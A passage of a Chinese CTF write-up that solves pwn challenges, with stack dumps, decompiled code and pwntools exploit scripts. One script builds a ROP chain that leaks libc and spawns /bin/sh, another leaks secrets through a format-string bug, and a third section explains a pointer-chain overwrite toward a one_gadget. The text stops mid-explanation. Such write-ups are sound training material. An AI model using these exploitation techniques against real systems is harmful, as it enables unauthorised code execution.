0x404788 (bss_buffer+1768) —▸ 0x40127b (vuln+115) ◂— leave</span><br></pre></td></tr></table></figure>
<ol start="14" type="1">
<li>控制执行的ret后</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RBP  0x404680 (bss_buffer+1504) ◂— 0</span><br><span class="line">*RSP  0x404750 (bss_buffer+1712) —▸ 0x40119e (magic+8) ◂— pop rdi</span><br><span class="line">*RIP  0x40119f (magic+9) ◂— ret</span><br><span class="line"></span><br><span class="line">► 0x40119f &lt;magic+9&gt;    ret                                &lt;magic+8&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x40119e &lt;magic+8&gt;    pop    rdi     RDI =&gt; 0x7b3a0bdd8678</span><br><span class="line">   0x40119f &lt;magic+9&gt;    ret                                &lt;magic+8&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x40119e &lt;magic+8&gt;    pop    rdi</span><br><span class="line">   0x40119f &lt;magic+9&gt;    ret                                &lt;magic+8&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x40119e &lt;magic+8&gt;    pop    rdi</span><br><span class="line"></span><br><span class="line">00:0000│ rsp 0x404750 (bss_buffer+1712) —▸ 0x40119e (magic+8) ◂— pop rdi</span><br><span class="line">01:0008│+0d8 0x404758 (bss_buffer+1720) —▸ 0x7b3a0bdd8678 ◂— 0x68732f6e69622f /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">02:0010│+0e0 0x404760 (bss_buffer+1728) —▸ 0x7b3a0bc50d70 (system) ◂— endbr64</span><br><span class="line">03:0018│+0e8 0x404768 (bss_buffer+1736) ◂— 0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">06:0030│+100 0x404780 (bss_buffer+1760) —▸ 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 0</span><br><span class="line">07:0038│+108 0x404788 (bss_buffer+1768) —▸ 0x40127b (vuln+115) ◂— leave</span><br></pre></td></tr></table></figure>
<ol start="15" type="1">
<li>magic执行</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RBP  0x404680 (bss_buffer+1504) ◂— 0</span><br><span class="line">*RSP  0x404758 (bss_buffer+1720) —▸ 0x7b3a0bdd8678 ◂— 0x68732f6e69622f /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">*RIP  0x40119e (magic+8) ◂— pop rdi</span><br><span class="line"></span><br><span class="line"> ► 0x40119e       &lt;magic+8&gt;     pop    rdi     RDI =&gt; 0x7b3a0bdd8678</span><br><span class="line">   0x40119f       &lt;magic+9&gt;     ret                                &lt;system&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7b3a0bc50d70 &lt;system&gt;      endbr64</span><br><span class="line">   0x7b3a0bc50d74 &lt;system+4&gt;    <span class="built_in">test</span>   rdi, rdi     0x7b3a0bdd8678 &amp; 0x7b3a0bdd8678     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF <span class="built_in">df</span> of ac ]</span><br><span class="line">   0x7b3a0bc50d77 &lt;system+7&gt;  ✘ je     system+16                   &lt;system+16&gt;</span><br><span class="line"></span><br><span class="line">00:0000│ rsp 0x404758 (bss_buffer+1720) —▸ 0x7b3a0bdd8678 ◂— 0x68732f6e69622f /* <span class="string">&#x27;/bin/sh&#x27;</span> */</span><br><span class="line">01:0008│+0e0 0x404760 (bss_buffer+1728) —▸ 0x7b3a0bc50d70 (system) ◂— endbr64</span><br><span class="line">02:0010│+0e8 0x404768 (bss_buffer+1736) ◂— 0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">05:0028│+100 0x404780 (bss_buffer+1760) —▸ 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 0</span><br><span class="line">06:0030│+108 0x404788 (bss_buffer+1768) —▸ 0x40127b (vuln+115) ◂— leave</span><br></pre></td></tr></table></figure>
<ol start="16" type="1">
<li>system执行</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RBP  0x404680 (bss_buffer+1504) ◂— 0</span><br><span class="line">*RSP  0x404760 (bss_buffer+1728) —▸ 0x7b3a0bc50d70 (system) ◂— endbr64</span><br><span class="line">*RIP  0x40119f (magic+9) ◂— ret</span><br><span class="line"></span><br><span class="line"> ► 0x40119f       &lt;magic+9&gt;     ret                                &lt;system&gt;</span><br><span class="line">    ↓</span><br><span class="line">   0x7b3a0bc50d70 &lt;system&gt;      endbr64</span><br><span class="line">   0x7b3a0bc50d74 &lt;system+4&gt;    <span class="built_in">test</span>   rdi, rdi     0x7b3a0bdd8678 &amp; 0x7b3a0bdd8678     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF <span class="built_in">df</span> of ac ]</span><br><span class="line">   0x7b3a0bc50d77 &lt;system+7&gt;  ✘ je     system+16                   &lt;system+16&gt;</span><br><span class="line"></span><br><span class="line">   0x7b3a0bc50d79 &lt;system+9&gt;    jmp    0x7b3a0bc50900              &lt;0x7b3a0bc50900&gt;</span><br><span class="line"></span><br><span class="line">00:0000│ rsp 0x404760 (bss_buffer+1728) —▸ 0x7b3a0bc50d70 (system) ◂— endbr64</span><br><span class="line">01:0008│+0e8 0x404768 (bss_buffer+1736) ◂— 0</span><br><span class="line">... ↓        2 skipped</span><br><span class="line">04:0020│+100 0x404780 (bss_buffer+1760) —▸ 0x404740 (bss_buffer+1696) —▸ 0x404680 (bss_buffer+1504) ◂— 0</span><br><span class="line">05:0028│+108 0x404788 (bss_buffer+1768) —▸ 0x40127b (vuln+115) ◂— leave</span><br></pre></td></tr></table></figure>
<p>上面就是我们的全部过程，看起来比较复杂，但是思路是很清晰的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line">leave_retn_addr=<span class="number">0x40127b</span></span><br><span class="line">start_addr=<span class="number">0x401264</span></span><br><span class="line">pop_rdi_ret_addr=<span class="number">0x40119e</span></span><br><span class="line">puts_got=<span class="number">0x404018</span></span><br><span class="line">puts_plt=<span class="number">0x401070</span></span><br><span class="line">write_addr=<span class="number">0x404880</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>            <span class="comment">#填充缓存区</span></span><br><span class="line">payload1+=p64(write_addr)     <span class="comment">#转移rbp</span></span><br><span class="line">payload1+=p64(start_addr)     <span class="comment">#重新执行read</span></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">payload2=p64(write_addr-<span class="number">0x100</span>)     <span class="comment">#再次转移rbp，这行所在是write_addr-0x40</span></span><br><span class="line">payload2+=p64(pop_rdi_ret_addr)    <span class="comment">#控制参数</span></span><br><span class="line">payload2+=p64(puts_got)            <span class="comment">#输出got表地址</span></span><br><span class="line">payload2+=p64(puts_plt)            <span class="comment">#执行puts</span></span><br><span class="line">payload2+=p64(start_addr)          <span class="comment">#重新执行read</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)*<span class="number">3</span>                 <span class="comment">#填充</span></span><br><span class="line">payload2+=p64(write_addr-<span class="number">0x40</span>)     <span class="comment">#指向payload2第一个8字节，程序原有的leave将rbp移到write_addr-0x40</span></span><br><span class="line">payload2+=p64(leave_retn_addr)     <span class="comment">#重新执行leave;ret，leave使rsp指向rbp+8,rbp指向write_addr-0x100，ret将pop rdi弹入rip执行</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">data = p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line">puts_addr = u64(data[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">sys_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">payload3=p64(write_addr-<span class="number">0x200</span>)      <span class="comment">#转移rbp，这行所在是write_addr-0x140</span></span><br><span class="line">payload3+=p64(pop_rdi_ret_addr+<span class="number">1</span>)   <span class="comment">#ret栈对齐</span></span><br><span class="line">payload3+=p64(pop_rdi_ret_addr)     <span class="comment">#控制参数</span></span><br><span class="line">payload3+=p64(bin_addr)             <span class="comment">#/bin/sh\x00</span></span><br><span class="line">payload3+=p64(sys_addr)             <span class="comment">#system</span></span><br><span class="line">payload3+=p64(<span class="number">0</span>)*<span class="number">3</span>                  <span class="comment">#填充</span></span><br><span class="line">payload3+=p64(write_addr-<span class="number">0x140</span>)     <span class="comment">#指向payload3第一个8字节，程序原有的leave将rbp移到write_addr-0x140</span></span><br><span class="line">payload3+=p64(leave_retn_addr)      <span class="comment">#重新执行leave;ret，leave使rsp指向rbp+8,rbp指向write_addr-0x200，ret将pop rdi弹入rip执行</span></span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="fmt">fmt</h3>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s2_1; <span class="comment">// [rsp+8h] [rbp-88h]</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">16</span>]; <span class="comment">// [rsp+10h] [rbp-80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s2[<span class="number">16</span>]; <span class="comment">// [rsp+20h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">88</span>]; <span class="comment">// [rsp+30h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+88h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  s2_1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20u</span>LL);</span><br><span class="line">  generate(s2, <span class="number">5LL</span>);</span><br><span class="line">  generate(s2_1, <span class="number">5LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hey there, little one, what&#x27;s your name?&quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">80</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Nice to meet you,&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I buried two treasures on the stack.Can you find them?&quot;</span>);</span><br><span class="line">  fgets(s1, <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(s1, s2, <span class="number">5uLL</span>) )</span><br><span class="line">    lose();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Yeah,another one?&quot;</span>);</span><br><span class="line">  fgets(s1, <span class="number">8</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(s1, s2_1, <span class="number">5uLL</span>) )</span><br><span class="line">    lose();</span><br><span class="line">  win();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">generate</span><span class="params">(__int64 a1, <span class="type">unsigned</span> __int64 i_1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[<span class="number">56</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ, <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt; i_1; ++i )</span><br><span class="line">    *(_BYTE *)(a1 + i) = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[(<span class="type">int</span>)arc4random_uniform(<span class="number">52LL</span>)];</span><br><span class="line">  *(_BYTE *)(a1 + i_1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You got it!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行完generate后</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffcc2f736c0 ◂— 0xc000</span><br><span class="line">01:0008│-088 0x7ffcc2f736c8 —▸ 0x654944ad82a0 ◂— 0x4e4c654b67 /* <span class="string">&#x27;gKeLN&#x27;</span> */</span><br><span class="line">02:0010│-080 0x7ffcc2f736d0 ◂— 0x1b00000</span><br><span class="line">03:0018│-078 0x7ffcc2f736d8 ◂— 0x300000</span><br><span class="line">04:0020│-070 0x7ffcc2f736e0 ◂— 0x4e6966444f /* <span class="string">&#x27;ODfiN&#x27;</span> */</span><br><span class="line">05:0028│-068 0x7ffcc2f736e8 —▸ 0x7ffcc2f73718 ◂— 0</span><br><span class="line">06:0030│-060 0x7ffcc2f736f0 ◂— 0xc500000006</span><br><span class="line">07:0038│-058 0x7ffcc2f736f8 ◂— 0</span><br></pre></td></tr></table></figure>
<p>可以看到一个密码储存在一个地址处，可以用%s泄露，另一个密码就是栈上的地址，可以用%p泄露</p>
<p>计算好偏移并接收泄露的密码，再发送出去就可以了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p = start()</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Hey there, little one, what&#x27;s your name?\n&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;%7$s&#x27;</span>+<span class="string">b&#x27;%10$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Nice to meet you,&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">s2_1= p.recv(<span class="number">5</span>)</span><br><span class="line">hex_str=p.recv(<span class="number">12</span>)</span><br><span class="line">hex_int = <span class="built_in">int</span>(hex_str, <span class="number">16</span>)</span><br><span class="line">byte_data = hex_int.to_bytes(length=<span class="number">5</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">s2 = byte_data.decode(<span class="string">&#x27;ascii&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;I buried two treasures on the stack.Can you find them?\n&quot;</span>)</span><br><span class="line">p.sendline(s2)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;Yeah,another one?\n&quot;</span>)</span><br><span class="line">p.sendline(s2_1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h3 id="fmt_s">fmt_s</h3>
<p>这题是我认为这次比赛pwn题最难的一道</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;re walking down the road when a monster appear.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">3</span> &amp;&amp; !flag; ++i )</span><br><span class="line">    talk();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)atk &lt;= <span class="number">0x1BF52</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You&#x27;ve been eaten by the monster.&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    he();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 <span class="title function_">talk</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You start talking to him...&quot;</span>);</span><br><span class="line">  flag ^= <span class="number">1u</span>;</span><br><span class="line">  read(<span class="number">0</span>, fmt, <span class="number">0x20u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(fmt);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You enraged the monster-prepare for battle!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> my_read(&amp;atk, <span class="number">8LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">he</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> command[<span class="number">6</span>]; <span class="comment">// [rsp+2h] [rbp-Eh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  qmemcpy(command, <span class="string">&quot;a_flag&quot;</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;The monster is defeated, and you obtain: flag?&quot;</span>);</span><br><span class="line">  system(command);</span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>fmt写入在bss段上，属于一道非栈上格式化字符串漏洞题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:00000000004040A0                 public atk</span><br><span class="line">.bss:00000000004040A0 atk             dq ?                    ; DATA XREF: talk+7A↑o</span><br><span class="line">.bss:00000000004040A0                                         ; main:loc_4013BE↑r</span><br><span class="line">.bss:00000000004040A8                 public flag</span><br><span class="line">.bss:00000000004040A8 flag            dd ?                    ; DATA XREF: talk+1B↑r</span><br><span class="line">.bss:00000000004040A8                                         ; talk+24↑w ...</span><br><span class="line">.bss:00000000004040AC                 align 20h</span><br><span class="line">.bss:00000000004040C0                 public fmt</span><br><span class="line">.bss:00000000004040C0 ; char fmt[256]</span><br><span class="line">.bss:00000000004040C0 fmt             db 100h dup(?)          ; DATA XREF: talk+2F↑o</span><br><span class="line">.bss:00000000004040C0                                         ; talk+43↑o</span><br><span class="line">.bss:00000000004040C0 _bss            ends</span><br></pre></td></tr></table></figure>
<p>没有后门函数，最好的方法就是使用one_gadget，修改返回地址来达到劫持程序的目的</p>
<p>非栈上格式化字符串一般是打一个指针串，就是先修改一个指针指向可以修改的地方，然后修改这个指针指向的指针的内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000 |  rsp 0x7ffd9784e118 → 0x40127c (vuln+101) ← lea rax, [rip + 0x2ddd]</span><br><span class="line">01:0008 | -010 0x7ffd9784e120 → 0x40129e (main) ← endbr64</span><br><span class="line">02:0010 | -008 0x7ffd9784e128 ← 0x3004011fa</span><br><span class="line">03:0018 |  rbp 0x7ffd9784e130 → 0x7ffd9784e140 ← 1</span><br><span class="line">04:0020 | +008 0x7ffd9784e138 → `0x4012ba (main+28)` ← mov eax, 0</span><br><span class="line">05:0028 | +010 0x7ffd9784e140 ← 1</span><br><span class="line">06:0030 | +018 0x7ffd9784e148 → 0x7fecc58f6d90 (__libc_start_call_main+128) ← mov edi, eax</span><br><span class="line">07:0038 | +020 0x7ffd9784e150 ← 0</span><br><span class="line">08:0040 | +028 0x7ffd9784e158 → 0x40129e (main) ← endbr64</span><br><span class="line">09:0048 | +030 0x7ffd9784e160 ← 0x19784e240</span><br><span class="line">0a:0050 | +038 `0x7ffd9784e168 → 0x7ffd9784e258 → 0x7ffd9785011b` ← 0x4853006e77702f2e / * <span class="string">&#x27;./pwn&#x27;</span> */</span><br><span class="line">0b:0058 | +040 0x7ffd9784e170 ← 0</span><br><span class="line">0c:0060 | +048 0x7ffd9784e178 ← 0xe37404db4f04c105</span><br><span class="line">0d:0068 | +050 0x7ffd9784e180 → 0x7ffd9784e258 → 0x7ffd9785011b ← 0x4853006e77702f2e / * <span class="string">&#x27;./pwn&#x27;</span> */</span><br><span class="line">0e:0070 | +058 0x7ffd9784e188 → 0x40129e (main) ← endbr64</span><br><span class="line">0f:0078 | +060 0x7ffd9784e190 → 0x403db8 (__do_global_dtors_aux_fini_array_entry) → 0x401180 (__do_global_dtors_aux) ← endbr64</span><br></pre></td></tr></table></figure>
<p>比如说，上面<code>0x4012ba (main+28)</code>是 vul 函数的返回地址，我们是不能直接修改这个值的</p>
<p>栈地址 –&gt;addr2–&gt;addr3，已知栈地址是第几个参数，我们能修改的是 addr3</p>
<p>栈上一般都有一些符合上述形式的链，如<code>0a:0050 | +038 0x7ffd9784e168 → 0x7ffd9784e258 → 0x7ffd9785011b</code></p>
<p>我们可以修改 addr3 为 0x7ffd9784e138 (vul 函数返回地址在栈上的位置)</p>
<p>这样的话，我们只需要知道 addr2 是第几个参数，那么我们就可以通过 addr2–&gt;addr3–&gt;vul_ret_addr 来修改 vul 函数的返回地址</p>
<p>下面演示的是“诸葛连弩”的打法：</p>
<p>栈上一般都会有可以获得libc基地址的东西，比如说__libc_start_main</p>
<p>我们先来看看talk函数的栈内容吧</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">00:0000│ rsp 0x7ffea6500670 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— <span class="string">&#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;</span></span><br><span class="line">01:0008│-008 0x7ffea6500678 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 1</span><br><span class="line">03:0018│+008 0x7ffea6500688 —▸ 0x4013b1 (main+66) ◂— add dword ptr [rbp - 4], 1</span><br><span class="line">04:0020│+010 0x7ffea6500690 ◂— 0x1000</span><br><span class="line">05:0028│+018 0x7ffea6500698 ◂— 0x100401110</span><br><span class="line">06:0030│+020 0x7ffea65006a0 ◂— 1</span><br><span class="line">07:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax</span><br><span class="line">08:0040│+030 0x7ffea65006b0 ◂— 0</span><br><span class="line">09:0048│+038 0x7ffea65006b8 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">0a:0050│+040 0x7ffea65006c0 ◂— 0x1a65007a0</span><br><span class="line">0b:0058│+048 0x7ffea65006c8 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— <span class="string">&#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;</span></span><br><span class="line">0c:0060│+050 0x7ffea65006d0 ◂— 0</span><br><span class="line">0d:0068│+058 0x7ffea65006d8 ◂— 0x6d26ff8a1914566c</span><br><span class="line">0e:0070│+060 0x7ffea65006e0 —▸ 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— <span class="string">&#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;</span></span><br><span class="line">0f:0078│+068 0x7ffea65006e8 —▸ 0x40136f (main) ◂— endbr64</span><br><span class="line">10:0080│+070 0x7ffea65006f0 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">11:0088│+078 0x7ffea65006f8 —▸ 0x7913edace040 (_rtld_global) —▸ 0x7913edacf2e0 ◂— 0</span><br><span class="line">12:0090│+080 0x7ffea6500700 ◂— 0x92dbb32a1476566c</span><br><span class="line">13:0098│+088 0x7ffea6500708 ◂— 0x9f01248f239e566c</span><br><span class="line">14:00a0│+090 0x7ffea6500710 ◂— 0x791300000000</span><br><span class="line">15:00a8│+098 0x7ffea6500718 ◂— 0</span><br><span class="line">... ↓        3 skipped</span><br><span class="line">19:00c8│+0b8 0x7ffea6500738 ◂— 0xb0add8007ab87600</span><br><span class="line">1a:00d0│+0c0 0x7ffea6500740 ◂— 0</span><br><span class="line">1b:00d8│+0c8 0x7ffea6500748 —▸ 0x7913ed829e40 (__libc_start_main+128) ◂— mov r15, qword ptr [rip + 0x1f0159]</span><br><span class="line">1c:00e0│+0d0 0x7ffea6500750 —▸ 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— <span class="string">&#x27;SHELL=/bin/bash&#x27;</span></span><br><span class="line">1d:00e8│+0d8 0x7ffea6500758 —▸ 0x403e00 (__do_global_dtors_aux_fini_array_entry) —▸ 0x4011c0 (__do_global_dtors_aux) ◂— endbr64</span><br><span class="line">1e:00f0│+0e0 0x7ffea6500760 —▸ 0x7913edacf2e0 ◂— 0</span><br><span class="line">1f:00f8│+0e8 0x7ffea6500768 ◂— 0</span><br><span class="line">20:0100│+0f0 0x7ffea6500770 ◂— 0</span><br><span class="line">21:0108│+0f8 0x7ffea6500778 —▸ 0x401110 (_start) ◂— endbr64</span><br><span class="line">22:0110│+100 0x7ffea6500780 —▸ 0x7ffea65007b0 ◂— 1</span><br><span class="line">23:0118│+108 0x7ffea6500788 ◂— 0</span><br><span class="line">24:0120│+110 0x7ffea6500790 ◂— 0</span><br><span class="line">25:0128│+118 0x7ffea6500798 —▸ 0x401135 (_start+37) ◂— hlt</span><br><span class="line">26:0130│+120 0x7ffea65007a0 —▸ 0x7ffea65007a8 ◂— 0x1c</span><br><span class="line">27:0138│+128 0x7ffea65007a8 ◂— 0x1c</span><br><span class="line">28:0140│+130 0x7ffea65007b0 ◂— 1</span><br><span class="line">29:0148│ r12 0x7ffea65007b8 —▸ 0x7ffea65029ee ◂— <span class="string">&#x27;/home/ubuntu/Moectf/fmt_s/pwn_patched&#x27;</span></span><br><span class="line">2a:0150│+140 0x7ffea65007c0 ◂— 0</span><br><span class="line">2b:0158│+148 0x7ffea65007c8 —▸ 0x7ffea6502a14 ◂— <span class="string">&#x27;SHELL=/bin/bash&#x27;</span></span><br><span class="line">2c:0160│+150 0x7ffea65007d0 —▸ 0x7ffea6502a24 ◂— <span class="string">&#x27;COLORTERM=truecolor&#x27;</span></span><br></pre></td></tr></table></figure>
<p>从这里可以得到libc基址</p>
<p><code>1b:00d8│+0c8 0x7ffea6500748 —▸ 0x7913ed829e40 (__libc_start_main+128)</code></p>
<p>偏移量是33，使用%33$p将地址输出出来并计算libc基址得到one_gadget地址</p>
<p>观察发现<code>07:0038│+028 0x7ffea65006a8 —▸ 0x7913ed829d90 ◂— mov edi, eax</code>是主函数的返回地址</p>
<p>偏移量是13，使用%13$p将地址输出出来便于修改为one_gadget</p>
<p>再将rbp的地址打印出来，便于修改rbp来达成one_gadget实现条件</p>
<p><code>02:0010│ rbp 0x7ffea6500680 —▸ 0x7ffea65006a0 ◂— 1</code></p>
<p>偏移量是8，打印 0x7ffea65006a0，再减去0x20得到rbp地址</p>
<p>另外要不断执行talk利用漏洞，需要注意<code>for ( i = 1; i &lt;= 3 &amp;&amp; !flag; ++i )</code></p>
<p>每次执行都有异或操作<code>flag ^= 1u;</code></p>
<p>需要我们每次利用都要使flag为0，怎么修改呢？</p>
<p>观察到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:00000000004040A0 atk             dq ?                    ; DATA XREF: talk+7A↑o</span><br><span class="line">.bss:00000000004040A0                                         ; main:loc_4013BE↑r</span><br><span class="line">.bss:00000000004040A8                 public flag</span><br><span class="line">.bss:00000000004040A8 flag            dd ?                    ; DATA XREF: talk+1B↑r</span><br><span class="line">.bss:00000000004040A8                                         ; talk+24↑w ...</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span> my_read(&amp;atk, <span class="number">8LL</span>);</span><br></pre></td></tr></table></figure>
<p>atk可以覆盖flag，于是我使用<code>fffffff0</code>来将flag覆盖为0</p>
<p>我们还需要无限次操作，修改i是必要的，此时我们只剩下两次操作机会，相当于只能修改一次任意地址的任意内容</p>
